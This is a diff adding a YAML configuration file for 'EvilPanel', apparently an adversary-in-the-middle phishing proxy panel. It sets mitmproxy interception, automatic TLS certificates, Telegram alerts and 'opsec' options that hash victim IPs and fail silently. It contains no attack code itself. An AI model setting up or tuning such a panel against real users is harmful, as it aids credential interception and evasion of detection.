@@ -1,0 +1,33 @@
+# EvilPanel Configuration
+# OPSEC: Never commit with real credentials
+
+server:
+  host: "0.0.0.0"
+  port: 443
+  dashboard_port: 8080
+  ssl_enabled: true
+
+database:
+  path: "data/evilpanel.db"
+  backup_enabled: true
+
+proxy:
+  mode: "mitmproxy"  # mitmproxy or go
+  concurrent_limit: 500
+  timeout: 30
+
+ssl:
+  auto_cert: true
+  certbot_email: ""
+  cert_path: "/etc/letsencrypt/live"
+
+notifications:
+  telegram_enabled: false
+  telegram_bot_token: ""
+  telegram_chat_id: ""
+
+opsec:
+  hash_victim_ips: true
+  silent_failure: true
+  cleanup_on_error: true
+
